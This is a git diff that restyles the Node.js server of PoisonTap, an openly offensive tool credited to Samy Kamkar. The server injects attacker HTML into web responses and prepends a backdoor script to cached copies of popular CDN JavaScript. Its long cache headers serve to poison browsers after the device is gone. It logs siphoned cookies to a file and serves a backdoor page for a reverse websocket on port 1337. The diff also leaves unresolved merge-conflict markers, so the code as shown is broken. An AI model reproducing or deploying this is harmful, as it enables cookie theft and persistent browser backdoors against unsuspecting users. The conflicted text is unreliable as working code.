@@ -1,66 +1,118 @@
+/* eslint-disable no-console */
 /*
  * PoisonTap
  *  by samy kamkar
  *  http://samy.pl/poisontap
  *  01/08/2016
- * 
+ *
  */
 
-var http = require("http");
-var fs = require('fs');
-var util = require('util');
-var backdoorPreJs = fs.readFileSync(__dirname + '/target_backdoor.js'); // this gets prepended before legit js, eg jquery.js
-var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
-var log_file = fs.createWriteStream(__dirname + '/poisontap.cookies.log', {flags : 'a'});
-var log_stdout = process.stdout;
-var replacejs = fs.readdirSync(__dirname + '/js');
-var blinked = false;
-var repobj = {};
-for (var i in replacejs)
-	repobj[replacejs[i].replace(/__/g, '/')] = fs.readFileSync(__dirname + '/js/' + replacejs[i]);
+const http = require('http');
+const fs = require('fs');
+const util = require('util');
+const exec = require('child_process').exec;
 
-console.log = function(d) {
-  log_file.write(util.format(d) + '\n');
-  log_stdout.write(util.format(d) + '\n');
+const backdoorPreJs = fs.readFileSync(`${__dirname}/target_backdoor.js`); // this gets prepended before legit js, eg jquery.js
+const backdoorHtml = fs.readFileSync(`${__dirname}/backdoor.html`);
+const logFile = fs.createWriteStream(`${__dirname}/poisontap.cookies.log`, {
+  flags: 'a',
+});
+const logStdout = process.stdout;
+const replacejs = fs.readdirSync(`${__dirname}/js`);
+let blinked = false;
+const repobj = {};
+
+replacejs.forEach((repjs) => {
+  const replaced = repjs.replace(/__/g, '/');
+  repobj[replaced] = fs.readFileSync(`${__dirname}/js/${repjs}`);
+});
+
+console.log = function consoleLog(d) {
+  logFile.write(`${util.format(d)}\n`);
+  logStdout.write(`${util.format(d)}\n`);
 };
 
-var startBlinking = function() {
-	// Configuration
-	var BLINK_MAX = 20;
-	var BLINK_SPEED = 100;
+const startBlinking = function startBlinking() {
+  // Configuration
+  const BLINK_MAX = 20;
+  const BLINK_SPEED = 100;
 
-	// Blinking function
-	var util = require('util'), exec = require('child_process').exec, child;
-	var oldState = 1;
-	var count = 0;
+  // Blinking function
+  let oldState = 1;
+  let count = 0;
 
-	var changeLedState = function(state) {
-		oldState = state;
-		child = exec('nice -n -20 echo '+state+' | sudo tee /sys/class/leds/led0/brightness');
-	}
+  const changeLedState = function changeLedState(state) {
+    oldState = state;
+    exec(`nice -n -20 echo ${state} | sudo tee /sys/class/leds/led0/brightness`);
+  };
 
-	var blink = function() {
-		changeLedState(oldState == 1 ? 0 : 1);
-		count++;
-		
-		if (count <= BLINK_MAX + 1) {
-			setTimeout(blink, BLINK_SPEED);
-		} else {
-			changeLedState(1);
-			setTimeout(function(){changeLedState(0)},3000);
-		}
-	}
+  const blink = function blink() {
+    changeLedState(oldState === 1 ? 0 : 1);
+    count += 1;
 
-	blink();
+    if (count <= BLINK_MAX + 1) {
+      setTimeout(blink, BLINK_SPEED);
+    } else {
+      changeLedState(1);
+      setTimeout(() => {
+        changeLedState(0);
+      }, 3000);
+    }
+  };
+
+  blink();
 };
 
-var xhtml = fs.readFileSync(__dirname + '/target_injected_xhtmljs.html');
-if (!xhtml)
-{
-	console.log("Couldn't read PoisonTap evil html");
-	process.exit();
+const xhtml = fs.readFileSync(`${__dirname}/target_injected_xhtmljs.html`);
+if (!xhtml) {
+  console.log("Couldn't read PoisonTap evil html");
+  process.exit();
 }
 
+<<<<<<< HEAD
+const server = http.createServer((request, response) => {
+  const url = request.headers.host + request.url;
+  console.log(`Request: ${url}`);
+  console.log(request.headers);
+
+  const headers = {
+    'Content-Type': 'text/html',
+    Server: 'PoisonTap/1.0 SamyKamkar/0.1',
+    'Cache-Control': 'public, max-age=99936000',
+    Expires: 'Sat, 26 Jul 2040 05:00:00 GMT',
+    'Last-Modified': 'Tue, 15 Nov 1994 12:45:26 GMT',
+  };
+
+  // cache for a very long time to poison future requests after we're gone
+  if (repobj[url]) {
+    console.log('>>> Known CDN');
+    response.writeHead(200, headers);
+    response.write(backdoorPreJs);
+    response.write(repobj[url]);
+    response.end();
+  } else if (url.indexOf('/PoisonTap') !== -1) {
+    // if this is a poisontap request, we just siphoned cookies, now drop html backdoor
+    // Blink ACT led on RPi to know if the injection is going well
+    if (!blinked) {
+      blinked = true;
+      startBlinking();
+    }
+
+    console.log('>>> Inject Backdoor HTML reverse ws 1337');
+    response.writeHead(200, headers);
+    response.write(backdoorHtml);
+    response.end();
+  } else {
+    // random AJAX request or load from a page
+    // give our evil content that loads all the backdoors and siphons all the things
+    console.log('>>> Inject Target xhtmljs');
+    response.writeHead(200, headers);
+
+    // NOT poisontap hit, inject cross-js/html file
+    response.write(xhtml);
+    response.end();
+  }
+=======
 var server = http.createServer(function(request, response) {
 	var url = request.headers.host + request.url;
 	console.log('Request: ' + url);
@@ -123,8 +175,9 @@ var server = http.createServer(function(request, response) {
 		response.end();
 		return;
 	}
+>>>>>>> 460092e19317eff2f76a7de7b7897de70628aca9
 });
 
 server.listen(1337);
-console.log("==== "+new Date().toJSON()+" ["+Date.now()+"] ====");
-console.log("PoisonTap is listening");
+console.log(`==== ${new Date().toJSON()} [${Date.now()}] ====`);
+console.log('PoisonTap is listening');
